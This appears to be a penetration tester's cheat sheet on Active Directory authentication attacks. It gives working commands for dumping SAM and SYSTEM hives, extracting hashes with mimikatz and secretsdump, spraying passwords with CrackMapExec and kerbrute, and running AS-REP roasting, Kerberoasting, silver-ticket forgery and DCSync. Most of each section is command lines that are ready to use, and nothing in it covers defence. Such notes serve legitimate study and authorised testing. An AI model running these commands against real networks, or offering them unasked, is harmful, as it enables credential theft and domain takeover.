# Active Directory Authentication Attacks

## Common Credentials Locations

### Clear-Text Files

Some places to look around include:
- Command history
    - Powershell: `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- Config files 
- Other files related to Windows Applications, such as Internet Browsers, Email Clients etc.
- Backup files
- Shared files/folders/repositories
- Registry
    - `reg query HKLM /f password /t REG_SZ /s` - `/f` SearchString; `/t` Type; `/s` Recursive (searches subkeys too)
    - Can replace `HKLM` with `HKCU` instead for current user key info
- Source code

### Other Locations

Other locations include:
- Database files
- Password managers
- Memory
- Active Directory
    - Users' description
    - Group Policy SYSVOL
    - NTDS (NT Directory Services - contains AD data)
    - AD Attacks e.g. Kerberoasting


## Local Windows Credentials Harvesting

### Keystrokes

Self-explanatory. Not really a penetesting thing, but more a red-teaming thing.

### SAM - Security Account Manager

- Database containing local account information, including usernames + passwords
- `C:\Windows\System32\config\sam`
- Encrypted storage and cannot be accessed by any user while the Windows OS is running
- Decryption keys are stored in the `system` file - `C:\Windows\System32\config\system`
- ...but it *can* still be accessed:

**Metasploit | HashDump**

**Microsoft Volume shadow copy service**

This service is used to make backups of files or entire drives. By doing this we can dump SAM:
1. Run `cmd.exe` prompt **as administrator** (important !)
2. Create shadow copy of `C:\` drive using `wmic`
3. Verify successful creation
4. Copy SAM database from shadow copy of volume to attacking machine for hash extraction.

In terms of commands, this is what we run:
```
wmic shadowcopy call create Volume='C:\'

vssadmin list shadows

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\<username>\Desktop\sam-shadow-copy

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\<username>\Desktop\system-shadow-copy
```

**Registry Hives**

Can dump SAM database content via Windows Registry using `reg.exe`:
```
reg save HKLM\SAM C:\Users\<username>\Desktop\sam-reg
reg save HKLM\SYSTEM C:\Users\<username>\Desktop\system-reg
```
Then SCP files back to attacking machine for extracting.

**Extracting Hashes**

Can use Impacket SecretsDump script (https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) with SAM and SYSTEM files passed as parameters to decrypt secrets:

```
python3.9 impacket/examples/secretsdump.py -sam /path/to/sam -system /path/to/system LOCAL
```

This will only yield NTLM hashes for local account access. For Active Directory NTLM hashes (which Metasploit HashDump gives), an additional hive is needed: `HKLM\Security` - this file also includes Kerberos keys, domain-cached credentials and security questions

Alternatively can use mimikatz `sekurlsa` module:

```
privilege::debug
sekurlsa::logonPasswords
```

Can then either HashCat these bitches for plaintext creds or exploit via other means e.g. Pass-the-Hash attacks


## Password attacks

### Policy Enumeration

```
net accounts
```

### LDAP and ADSI

Can incorporate the following PowerShell code into a wider script to enumerate valid credentials.

It:
1. gets domain name;
2. gets the primary domain controller name;
3. constructs an LDAP query path; and
4. attempts to build a new `DirectoryEntry` class pointing to the top of the domain.

If #4 executes without errors, then the credentials were valid. If it throws errors, it was not valid.

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://" + $PDC + "/" + "DC=$($domainObj.Name.Replace('.',',DC='))"

NewObject System.DirectoryServices.DirectoryEntry($SearchString, "TEST_USERNAME_HERE", "TEST_PASSWORD_HERE")
```

Community tools already exist though, such as:
- `Spray-Passwords.ps1`
    - `.\Spray-Passwords.ps1 -Pass <TEST_PASSWORD_HERE> -Admin`
    - Above will automatically identify AD users and spray passwords using methods similar to the PowerShell script defined above.
    - https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1

Can also use CrackMapExec:

```
link@kali:~$ crackmapexec smb <DC-IP> -u usernames.txt -p "<PASSWORD>" --continue-on-success --no-bruteforce
```

### SMB
- `crackmapexec`
    - `crackmapexec smb <TARGET> -u usernames.txt -p '<TEST_PASSWORD_HERE> -d <TARGET_DOMAIN> --continue-on-success`
    - Attempts to SMB connect with users against target.
    - Quite noisy and slow due to SMB connections being established.
    - Can run from Kali.

### Kerberos Authentication Server Request
- `kerbrute`
    - `.\kerbrute.exe passwordspray -d <TARGET_DOMAIN> .\usernames.txt "<TEST_PASSWORD_HERE>"`
    - Just sends 2 UDP frames for Kerberos AS-REQ and examines responses.
    - Run executable on windows.
    - https://github.com/ropnop/kerbrute


## Kerberos Attacks

### AS-REP Roasting

After Kerberos' Authentication Server Request (AS-REQ) from CLIENT to KEY DISTRIBUTION CENTER (KDC), KDC should validate the encrypted timestamp by looking up password hash of username specified in AS-REQ.

This is called **Kerberos preauthentication**.

"Do not require Kerberos preauthentication" is a setting that *may* be applied to some users, but is not enabled by default. This means KDC won't validate the AS-REQ so we can receive an encrypted AS-REP with any user's password hash depending on the username we supplied in AS-REQ.

We can try to crack the password hash of the user from the session key used to encrypt AS-REP. 

**Tools**

KALI: Can use `impacket-GetNPUsers` to enumerate vulnerable users

```
// Need access to target user specified below to enumerate AS-REP-Roastable users across the domain
impacket-GetNPUsers -dc-ip <TARGET_DOMAIN_CONTROLLER> -request -outputfile hashes.asreproast <TARGET_DOMAIN>/<TARGET_USER>
```

WINDOWS: Can use `Rubeus` to obtain AS-REP hash

```
# /nowrap prevents new line from being added to the outputted hashes
.\Rubeus.exe asresproast /nowrap
```

THEN use Hashcat with AS-REP config to crack user's password.

### Kerberoasting

When a user account (NOT a computer account) has a Service Principal Name (SPN) associated with it, you can request a ticket to the TGS for the respective service (TGS-REQ).

The response (TGS-REP) contains an encrypted service ticket using the SPN's associated user account password hash. Kerberoasting is cracking this hash.

**Tools**

KALI: Can use `impacket-GetUserSPNs` to enumerate Kerberoastable user accounts and get hashes

```
// Need access to target user specified below to enumerate Kerberoastable users across the domain
impacket-GetUserSPNs -request -dc-ip <TARGET_DOMAIN_CONTROLLER> <TARGET_DOMAIN>/<TARGET_USER>
```

WINDOWS: Can use `Rubeus` to enumerate Kerberoastable users and obtain hashes

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
 
THEN plug into hashcat with TGS-REP config to crack user's password.  

### Silver Tickets

Privileged Account Certificate (PAC) validation is an optional verification process the SPN application does with the Domain Controller. This validates any user attempting to authenticate to the SPN app with the DC, as well as their roles.

This is usually disabled, so we can write our own *Silver Tickets* which let us declare any roles and permissions we want when authenticating to the service.

What is needed?
- SPN password hash (NTLM hash of service user account)
    - Use Mimikatz `privilege::debug` and `sekurlsa::logonPasswords` on a machine where the SPN app account has a session and you have administrative access to
- Domain SID
     - `whoami /user`, omit the RID (last set of digits usually) to get the Domain SID
- Target SPN

Can then use Mimikatz to forge a Silver Ticker and inject into memory for subsequent use in authenticating to services.

```
# /ptt for pass-the-ticket - injects forged Silver Ticket into memory
# /service depends on the protocol of the SPN application e.g. http

C:\> kerberos::golden /sid:<DOMAIN_SID> /domain:<TARGET_DOMAIN> /ptt /target:<TARGET> /service:<SPN_PROTOCOL> /rc4:<SPN_PASSWORD_HASH> /user:<DOMAIN_USER>


# To confirm ticket is in memory - check Group Ids for associated privileges (500 = Local admin, 512 = Domain admin etc.)

C:\> klist 
```

Before 11/10/2022, it was possible to forge Golden Tickets and Silver Tickets for users who do not exist within the domain. Microsoft issued a security patch to ensure the PAC_REQUESTOR is validated by a DC provided that the client and KDC are in the same domain.

### Dcsync Attack

In prod environments, usually more than one Domain Controller for redundancy.

Must be synced, and it does this by replication.

There are no checks on who the requester is for replication so we can exploit this by obtaining credential data like NTLM hashes via requesting for replication.

This requires the following rights which are usually covered under **Domain Administrator**, **Enterprise Administrators** and other **Administrator** accounts:
- *Replicating Directory Changes*
- *Replicating Directory Changes All*
- *Replicating Directory Changes in Filtered Set*

KALI: Can use `impacket-secretsdump` to obtain hashes

```
impacket-secretsdump -just-dc-user <TARGET_USERNAME> <TARGET_DOMAIN>/<USER_WITH_RIGHTS>:<USER_WITH_RIGHTS_PASSWORD>@<TARGET_DOMAIN_CONTROLLER>
```

WINDOWS: Can use Mimikatz' `lsadump::dcsync` to obtain hashes

```
lsadump::dcsync /user:<DOMAIN>\<USER>
```

THEN plug into Hashcat for cracking.